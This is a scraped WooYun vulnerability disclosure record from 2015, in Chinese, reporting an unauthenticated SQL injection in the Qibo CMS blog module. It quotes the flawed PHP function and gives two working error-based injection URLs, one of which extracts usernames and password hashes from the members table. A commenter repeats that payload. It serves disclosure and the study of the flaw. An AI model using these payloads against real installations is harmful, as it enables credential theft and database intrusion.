{"id": 32188, "wybug_id": "wooyun-2015-0112049", "wybug_title": "齐博博客系统sql注入一枚(版本限制，部分通过）", "wybug_corp": "齐博CMS", "wybug_author": "牛肉包子", "wybug_date": "2015-05-05 17:08", "wybug_open_date": "2015-08-06 11:34", "wybug_type": "SQL注射漏洞", "wybug_level": "高", "wybug_rank_0": "20", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["源码分析"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2015-05-05：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2015-05-08：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2015-05-11：\t细节向第三方安全合作伙伴开放\t\t\t\t\t\t\t\t\t2015-07-02：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2015-07-12：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2015-07-22：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2015-08-06：\t细节向公众公开  简要描述： 无需登录，无需注册直接出数据。 详细说明：  无需登录，无需注册直接出数据。--------------------------------------------------------------------------------------看到/blog/template/space/file/listbbs.php\nfunction get_listbbs($rows){\tglobal $db,$uid,$TB_pre,$Mrows,$page,$Morder,$Mdesc,$webdb,$VlogCfg;\t$VlogCfg[content_leng]==0 && $VlogCfg[content_leng]=120;\tif($page<1){\t\t$page=1;\t}\t$min=($page-1)*$rows;\t$albumid && $SQL=\" AND albumid='$albumid' \";\t$Mdesc[listbbs] || $Mdesc[listbbs]='DESC';\t$Morder[listbbs] || $Morder[listbbs]=\"tid\";\t$query = $db->query(\"SELECT T.*,C.* FROM {$TB_pre}threads T LEFT JOIN {$TB_pre}tmsgs C ON T.tid=C.tid WHERE T.authorid='$uid' ORDER BY T.$Morder[listbbs] $Mdesc[listbbs] LIMIT $min,$rows\");\twhile($rs = $db->fetch_array($query)){\t\t$rs[postdate]=date(\"Y-m-d H:i\",$rs[postdate]);\t\tif($VlogCfg[content_leng]>0){\t\t\t$rs[content]=@preg_replace('/<([^>]*)>/is',\"\",$rs[content]);\t//把HTML代码过滤掉\t\t\t$rs[content]=get_word($rs[content],$VlogCfg[content_leng]);\t\t}else{\t\t\t$rs[content]='';\t\t}\t\t$listdb[]=$rs;\t}\treturn $listdb;}\n这个函数中的$TB_pre未初始化，然后根据齐博系统的伪全局变量注册。然后造成sql注入。可以构造\nhttp://127.0.0.1/qibo_blog/blog/index.php?file=listbbs&uid=1&id=1&TB_pre=qb_module where 1=1 or updatexml(2,concat(0x7e,(user())),0) %23\n\n\n然后构造\nhttp://127.0.0.1/qibo_blog/blog/index.php?file=listbbs&uid=1'&id=1&TB_pre=qb_module where 1=1 or updatexml(2,concat(0x7e,((select concat(username,0x5c,password) from qb_members limit 0,1))),0) %23\n\n\ndemo测试\n\n   漏洞证明：  \n\n   修复方案：  初始化   版权声明：转载请注明来源 牛肉包子@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：中 漏洞Rank：10  确认时间：2015-05-08 11:34 厂商回复： 这个问题之前有人提出来了。 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2015-05-05 17:12 |    \t\t玉林嘎 \t\t\t( 普通白帽子  |\t\t\t        Rank:758 漏洞数:96        )\t\t \n  mark    \n     2015-05-05 17:15 |    \t\t明月影 \t\t\t( 路人 |\t\t\t        Rank:12 漏洞数:8        | 学姿势，学思路。)\t\t \n  看看。    \n     2015-05-05 17:27 |    \t\tprolog \t\t\t( 普通白帽子  |\t\t\t        Rank:544 漏洞数:107        | 低调求发展)\t\t \n  你的通用怎么都没钱。。    \n     2015-05-05 17:52 |    \t\t孤独行者 \t\t\t( 普通白帽子  |\t\t\t        Rank:110 漏洞数:44        | 时光如水，总是无言。你若安好，便是晴天)\t\t \n  你的 通用怎么都没钱。    \n     2015-05-05 17:56 |    \t\tsco4x0 \t\t\t( 实习白帽子  |\t\t\t        Rank:31 漏洞数:13        | O_o)\t\t \n  番茄湿父你的通用怎么都没$    \n     2015-05-05 18:27 |    \t\t牛肉包子 \t\t\t( 普通白帽子  |\t\t\t        Rank:254 漏洞数:64        )\t\t \n  因为还没到发钱的时候    \n     2015-05-05 19:59 |    \t\tXser \t\t\t( 普通白帽子  |\t\t\t        Rank:194 漏洞数:61        | JDSec)\t\t \n  code 区域http://127.0.0.1/qibo_blog/blog/index.php?file=listbbs&uid=1'&id=1&TB_pre=qb_module where 1=1 or updatexml(2,concat(0x7e,((select concat(username,0x5c,password) from qb_members limit 0,1))),0) %23 为什么我看到了详细    \n     2015-05-05 20:08 |    \t\t玉林嘎 \t\t\t( 普通白帽子  |\t\t\t        Rank:758 漏洞数:96        )\t\t \n  又出BUG咯。。。    \n     2015-05-05 20:10 |    \t\t孤独行者 \t\t\t( 普通白帽子  |\t\t\t        Rank:110 漏洞数:44        | 时光如水，总是无言。你若安好，便是晴天)\t\t \n  又出bug咯    \n     2015-05-05 23:02 |    \t\t小飞 \t\t\t( 实习白帽子  |\t\t\t        Rank:37 漏洞数:12        | 挖洞对于16岁的我来说实在是太艰难了！10...)\t\t \n  为啥我能看到详细    \n     2015-05-05 23:02 |    \t\tprolog \t\t\t( 普通白帽子  |\t\t\t        Rank:544 漏洞数:107        | 低调求发展)\t\t \n  为啥我能看到详细    \n     2015-05-05 23:16 |    \t\tsco4x0 \t\t\t( 实习白帽子  |\t\t\t        Rank:31 漏洞数:13        | O_o)\t\t \n  我也看到了。。    \n     2015-05-05 23:51 |    \t\tthewind \t\t\t( 实习白帽子  |\t\t\t        Rank:41 漏洞数:6        | 小白……)\t\t \n  为什么状态是未审核，我就看到详细了·······    \n     2015-05-06 08:57 |    \t\t平底斜 \t\t\t( 路人 |\t\t\t        Rank:12 漏洞数:2        | 性骄奢，好声色，为文有汉魏风)\t\t \n  好神奇，我竟然看到了    \n     2015-08-06 13:29 |    \t\tBeenQuiver \t\t\t( 普通白帽子  |\t\t\t        Rank:101 漏洞数:26        | 专注而高效，坚持好的习惯千万不要放弃)\t\t \n  伪全局    \n     2015-09-11 17:12 |    \t\t康小泡 \t\t\t( 路人 |\t\t\t        Rank:0 漏洞数:1        | 掉个offer给我吧)\t\t \n  爷爷带我搞站    \n  \n\n\n", "wybug_level_fromcorp": "中", "wybug_rank_fromcorp": 10, "Ranks": null}